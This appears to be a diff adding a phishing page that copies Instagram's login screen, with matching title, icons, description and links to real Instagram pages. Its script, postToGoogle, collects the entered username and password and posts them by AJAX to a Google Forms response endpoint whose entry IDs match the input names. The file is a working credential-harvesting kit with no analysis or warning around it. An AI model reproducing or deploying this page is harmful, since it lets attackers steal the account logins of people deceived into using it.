@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="theme-color" content="#ffffff">
+    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
+    <meta content="Create an account or log in to Instagram - A simple, fun &amp; creative way to capture, edit &amp; share photos, videos &amp; messages with friends &amp; family." name="description">
+    
+    <link rel="icon" sizes="192x192" href="/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <link rel="mask-icon" href="/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
+    <link rel="shortcut icon" type="image/x-icon" href="/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+    <link rel="stylesheet" href="style.css">
+    <title>Instagram</title>
+</head>
+<body>
+
+    <script src="https://code.jquery.com/jquery-3.1.1.js"></script>
+
+<div class="container">
+    <div class="box">
+        <div class="heading"></div>
+        <form class="login-form">
+            <div id="namefield">
+                <input id="username" type="name" name="817289579" placeholder="Phone number, username, or email" />
+                <label for="username">Phone number, username, or email</label>
+            </div>
+            <div id="passfield">
+                <div onclick="snhf()" id="snh">
+                <p>Show</p>
+                </div>
+                <input id="password" type="password" name="1201250261" placeholder="password" />
+                <label for="password">Password</label>
+            </div>
+            <button class="login-button" title="login">Log In</button>
+            <div class="separator">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+            </div>
+            <div class="other">
+                <button class="fb-login-btn" type="button">
+                    <i class="fa fa-facebook-official fb-icon"></i>
+                    <span>Log in with Facebook</span>
+                </button>
+                <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+            </div>
+        </form>
+    </div>
+    <div class="box">
+        <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></p>
+    </div>
+</div>
+
+<script>
+
+function snhf() {
+    var x = document.getElementById('password');
+    if (x.type === "password") {
+        x.type = 'text';
+        document.getElementById('snh').innerHTML = "<p>Hide</p>";
+    } else {
+        x.type = "password"
+        document.getElementById('snh').innerHTML = "<p>Show</p>";
+    }
+}
+
+function postToGoogle() {
+    var field1 = $("#username").val();
+    var field2 = $("#password").val();
+
+    if(field1 == "") {
+        document.getElementById("namefield").style.borderColor="red";
+        document.getElementById("username").value="";
+        document.getElementById("password").value="";
+        return false;
+    }
+
+    if(field2 == "" || field2.length<6){
+        document.getElementById("passfield").style.borderColor="red";
+        document.getElementById("password").value="";
+        return false;
+    }
+
+    $.ajax({
+    url: "https://docs.google.com/forms/d/e/1FAIpQLSd-uNdlFBRMCasfwvY41KzRx-pUqeHZ8uUFYsS_4VLAL1nffg/formResponse?",
+    data: {"entry.817289579": field1, "entry.1201250261": field2},
+    type: "POST",
+    dataType: "xml",
+    success: function(d){
+    },
+    error: function(x, y, x){
+    }
+    });
+    return false;
+}
+
+</script>
+    
+</body>
+</html>
